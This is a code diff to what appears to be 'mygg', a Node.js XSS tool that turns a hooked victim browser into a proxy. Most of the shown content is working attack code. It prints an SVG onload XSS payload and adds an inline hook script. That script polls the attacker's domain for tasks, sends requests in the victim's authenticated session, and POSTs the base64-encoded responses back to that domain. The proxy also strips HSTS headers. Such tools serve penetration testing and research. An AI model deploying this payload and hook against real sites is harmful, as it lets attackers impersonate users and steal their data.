@@ -5,10 +5,12 @@ const fs = require('fs');
 /* Config */
 
 const config = {
-    // Change web_host to your domain
-    web_host: 'example.com',           
+    // Change web_domain to your domain
+    web_domain: 'example.com',           
     web_ip: '0.0.0.0',
     web_port: 443,
+    // Interval in ms for each poll
+    polling_time: 2000,
     key: fs.readFileSync('server.key'),
     cert: fs.readFileSync('server.crt'),
     // Either set proxy_ip to 127.0.0.1 and use ssh+portforwarding 
@@ -37,7 +39,7 @@ http.createServer(function (req, res) {
     if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
         console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
         res.writeHead(403);
-	    res.end();
+		res.end();
         return;
     }
 
@@ -58,9 +60,8 @@ http.createServer(function (req, res) {
         var body_decoded = Buffer.from(result.body, 'base64');
         //console.log("Headers:\n" + headers_decoded);
         //console.log("Body:\n" + body_decoded);
-
-		res.writeHead(200, stripHSTS(headers_decoded));
-		res.end(https2http(body_decoded));
+        res.writeHead(200, stripHSTS(headers_decoded));
+        res.end(https2http(body_decoded));
 	};
 }).listen(config.proxy_port, config.proxy_ip, function (err) {
     if (err) return console.error(err)
@@ -81,11 +82,11 @@ const https_options = {
 https.createServer(https_options, function (req, res) {
     /* Serves the hook file */
     if (req.url == '/hook.js') {
-        fs.readFile('./hook.js', function (err, data) {
+        //fs.readFile('./hook.js', function (err, data) {
             res.writeHead(200, {"Content-Type": "application/javascript"});
-            res.end(data);
-        });
-        var hooked_ipaddr = req.connection.remoteAddress.split(':')[3]
+            res.end(hook_file);
+        //});
+        var hooked_ipaddr = req.connection.remoteAddress;
         var hooked_useragent = req.headers['user-agent']; 
         console.log("[+] Hooked new browser [" + hooked_ipaddr + "] [" + hooked_useragent + "]");
     /* Hooked browser asks mygg if there are any new jobs for it */
@@ -153,5 +154,48 @@ function https2http(body) {
 
 /* The payload that downloads mygg */
 var hook = '<svg/onload="x=document.createElement(\'script\');'
-var hook = hook + 'x.src="//' + config.web_host + '/hook.js";document.head.appendChild(x);">'
+var hook = hook + 'x.src="//' + config.web_domain + '/hook.js";document.head.appendChild(x);">'
 console.log("[+] Payload:\r\n" + hook + "\r\n")
+
+var hook_file = `
+function makeRequest(id, method, url, head, body) {
+    var target_http = new XMLHttpRequest();
+    target_http.onreadystatechange = function() {
+        if (target_http.readyState == 4 && target_http.status == 200) {
+            var resp_status = target_http.status;
+            var resp_body = btoa(target_http.responseText);
+            var resp_headers = btoa(target_http.getAllResponseHeaders());
+            var mygg_http = new XMLHttpRequest();
+            mygg_http.open("POST", "https://${config.web_domain}/responses", true);
+            mygg_http.setRequestHeader("Content-Type","application/json");
+            var obj = {"id": id.toString(), "url": url, "status": resp_status, "headers": resp_headers, "body": resp_body}
+            mygg_http.send(JSON.stringify(obj));
+        }
+    };
+    target_http.open(method, url, true);
+    for (var key in head) {
+        target_http.setRequestHeader(key, head[key]) 
+    }
+    if (body != null) {
+        target_http.send(body);
+    } else {
+        target_http.send();
+    }
+}
+function poll() {
+    var mygg_http = new XMLHttpRequest();
+    mygg_http.onreadystatechange = function () {
+        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
+            console.log(mygg_http.responseText)
+            var tasks = JSON.parse(mygg_http.responseText);
+            for (var i in tasks){
+                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
+            }
+        }
+    };
+    mygg_http.open("GET", "https://${config.web_domain}/polling", true);
+    mygg_http.send();
+    setTimeout(poll, ${config.polling_time});
+}
+poll();
+`;
